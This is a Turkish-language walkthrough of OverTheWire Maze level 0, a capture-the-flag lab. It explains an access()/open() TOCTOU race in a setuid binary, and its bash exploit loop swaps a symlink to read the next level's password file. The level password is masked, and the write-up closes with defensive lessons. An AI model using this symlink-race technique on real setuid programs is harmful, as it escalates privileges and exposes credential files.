# OverTheWire — Maze Level 0 → 1

> Hedef: `maze0`'dan `maze1` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: **TOCTOU yarış koşulu** — `access()`/`open()` arası "confused deputy" (kafası karışmış vekil).

---

## 1. Bağlantı
```bash
ssh maze0@maze.labs.overthewire.org -p 2225   # şifre: maze0
```
`/maze/maze0` → `-r-sr-x---  maze1 maze0` (setuid maze1). Binary 32-bit, debug_info ile derlenmiş (semboller mevcut), Canary + NX açık ama burada önemsiz.

## 2. Analiz (`objdump -d -M intel`)
Sözde-kod:
```c
char buf[20];
if (access("/tmp/128ecf542a35ac5270a87dc740918404", R_OK) == 0) {  // GERÇEK uid (maze0) kontrolü
    setresuid(geteuid(), geteuid(), geteuid());                     // maze1'e tam yüksel
    int fd = open("/tmp/128ecf...404", O_RDONLY);                   // EFEKTİF uid (maze1) ile aç
    read(fd, buf, 19);
    write(1, buf, 19);                                              // içeriği bas
}
```

## 3. Zafiyet
- `access()` **gerçek uid** (maze0) ile kontrol eder: "bu dosyayı *çağıran* okuyabiliyor mu?"
- Ama `open()` `setresuid` sonrası **efektif uid** (maze1) ile açar.
- İki çağrı arasında dosya **aynı yol** üzerinden değiştirilebilir → klasik **TOCTOU** (Time-Of-Check to Time-Of-Use) yarışı.

Tek başına bir symlink işe yaramaz: `access()` symlink'i takip eder, maze0 şifre dosyasını okuyamadığı için kontrol kalır. Çözüm, yolu iki çağrı arasında **takas etmek**:
- decoy → maze0'ın okuyabildiği bir dosya (`access` geçer)
- secret → `/etc/maze_pass/maze1` symlink (`open` bunu maze1 olarak okur)

## 4. Exploit
İki döngü: biri symlink hedefini hızla değiştirir, diğeri maze0'ı tekrar tekrar çalıştırır.
```bash
P=/tmp/128ecf542a35ac5270a87dc740918404
echo DECOYDECOYDECOY > /tmp/decoy            # maze0 okuyabilir → access OK
( while :; do
    ln -sf /tmp/decoy "$P"
    ln -sf /etc/maze_pass/maze1 "$P"
  done ) &                                    # arka planda sürekli takas
while :; do
  out=$(/maze/maze0 | tr -d '\0')
  case "$out" in *DECOY*|"") : ;; *) echo "WIN: $out"; break;; esac
done
```
`access()` decoy'u görüp geçtiği, `open()` ise tam o an secret symlink'e denk geldiği iterasyonda şifre basılır.

> Bende **204 denemede** kazandı → `maze1` şifresi düştü.

## Dersler
| Konu | Not |
|------|-----|
| TOCTOU | `access()`+`open()` ikilisi klasik yarış açığıdır; kontrol ile kullanım atomik değil |
| `access()` tuzağı | gerçek uid'i kontrol eder, asla yetki kararı için kullanılmamalı (sadece `open()` + hata kontrolü doğru yol) |
| confused deputy | setuid program, düşük yetkili kullanıcı adına yüksek yetkiyle iş yapıyor |
| Yarışı kazanmak | `ln -sf` ile sürekli takas + hedefi döngüde çalıştırma yeterli |
